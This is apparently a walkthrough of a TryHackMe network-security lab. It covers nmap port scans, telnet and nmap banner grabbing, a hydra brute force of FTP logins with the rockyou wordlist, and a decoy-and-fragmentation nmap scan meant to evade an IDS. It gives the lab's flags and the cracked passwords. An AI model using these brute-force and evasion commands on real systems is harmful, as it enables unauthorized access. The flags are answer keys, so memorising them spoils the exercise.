Objectives:

Only use nmap, telnet and hydra for this task.


Q: What is the highest port number being open less than 10,000?
```
Method:

$ sudo nmap -sT <TARGET IP> -p 1-10000

Result:

<SNIP>
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
139/tcp  open     netbios-ssn
445/tcp  open     microsoft-ds
4259/tcp filtered vrml-multi-use
6502/tcp filtered netop-rc
8080/tcp open     http-proxy
8954/tcp filtered cumulus-admin
<SNIP>

From our results we can see that the highest *open* port is 8080
```
A: 8080

Q: There is an open port outside the common 1000 ports; it is above 10,000. What is it?
```
Method:

As seen previously, my nmap scan was narrowed down to every port below 10,000 for this question I must try the following

(I chose to 15000 to have a shorter scan and hopefully discover the port rather than 10000 all the way to 65355)

$ sudo nmap -sT <TARGET IP> -p 10000-15000 -v10

Result:

<SNIP>
PORT      STATE SERVICE REASON
10021/tcp open  unknown syn-ack
<SNIP>
```
A: 10021

Q: How many TCP ports are open?
```
Method:

Just based off of the previous two scan results I'd assume that there are a total of 6 TCP ports explicitly open

```
A: 6

Q: What is the flag hidden in the HTTP server header?
```
Method:

We know that telnet can connect to services that operate in plaintext communication, so it is perfect for HTTP header grabbing due to HTTP not having either TLS or SSL

Let's connect:

$ telnet <TARGET IP> 80

Result:
Trying <TARGET IP>...
Connected to <TARGET IP>.

Next we must craft a HTTP request and send it to the HTTP server

Input:
GET / HTTP/1.1.
host: telnet

Result:

<SNIP>
HTTP/1.1 200 OK
Vary: Accept-Encoding
Content-Type: text/html
Accept-Ranges: bytes
ETag: "229449419"
Last-Modified: Tue, 14 Sep 2021 07:33:09 GMT
Content-Length: 226
Date: Thu, 18 May 2023 22:31:32 GMT
Server: lighttpd THM{web_server_25352}
<SNIP>


```
A: THM{web_server_25352}

Q: What is the flag hidden in the SSH server header?
```
Method:

$ nmap -sV --script banner <TARGET IP> -p 22

Result:

<SNIP>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
|_banner: SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port22-TCP:V=7.93%I=7%D=5/18%Time=6466A883%P=aarch64-unknown-linux-gnu%
SF:r(NULL,29,"SSH-2\.0-OpenSSH_8\.2p1\x20THM{946219583339}\r\n");
<SNIP>

```
A: THM{946219583339}

Q: We have an FTP server listening on a nonstandard port. What is the version of the FTP server?
```
Method:

Let's try running the nmap script we ran previously but with ftp, I am going to attempt to target that "higher than 10000" TCP port we discovered earlier to see if that is the nonstandard port. I see "21" within 10021 which is FTP's standard port.

$ nmap -sV --script banner <TARGET IP> -p 10021

Result:
<SNIP>
PORT      STATE SERVICE VERSION
10021/tcp open  ftp     vsftpd 3.0.3
|_banner: 220 (vsFTPd 3.0.3)
Service Info: OS: Unix
<SNIP>
```
A: vsftpd 3.0.3

Q: We have learned two usernames using social engineering: eddie and quinn. What is the flag hidden in one of these two account files and accessible via FTP?
```
Method:

Now it seems like it's time for some bruteforcing, lets use hydra.

I am going to use a wordlist called rockyou.txt which is a popular leak file of commonly used passwords

$ hydra -l "eddie" -P /usr/share/wordlists/rockyou.txt <TARGET IP> -s 10021 ftp

Result:
<SNIP>
[10021][ftp] host: <TARGET IP>   login: eddie   password: jordan
<SNIP>

lets also grab quinn's login

$ hydra -l "quinn" -P /usr/share/wordlists/rockyou.txt <TARGET IP> -s 10021 ftp

Result:
<SNIP>
[10021][ftp] host: <TARGET IP>   login: quinn   password: andrea
<SNIP>

lets check out their ftp areas with

$ ftp <username>@<TARGET IP> -p 10021

ftp will then ask us to input the relevent passwords.

when using "dir" eddie's area reported an empty directory so I moved on to quinn, when using "dir" I see a ftp_flag.txt file

in ftp, to retrieve the file I

$ get ftp_flag.txt

Result:
<SNIP>
150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
100% |**********************************************************************|    18        4.56 KiB/s    00:00 ETA
226 Transfer complete.
18 bytes received in 00:00 (0.41 KiB/s)
<SNIP>

exit the ftp with "exit" command and then:

$ cat ftp_flag.txt

Result:
THM{321452667098}
```
A: THM{321452667098}

Q: Browsing to http://<TARGET IP>:8080 displays a small challenge that will give you a flag once you solve it. What is the flag?

```
Method:

Head to browser and view site:
Your mission is to use Nmap to scan 10.10.200.175 (this machine)
as covertly as possible and avoid being detected by the IDS.

This seems to me like some fragmentation + random decoy IP's might be needed to evade detection. Connection based scans may not be suitable here as they make too much noise so lets try a null scan.

$ sudo nmap -sN -f -D RND:5,<MY IP> <TARGET IP>

Result:
(on website)

Exercise Complete! Task answer: THM{f7443f99} 
```

A: THM{f7443f99}

LAB COMPLETED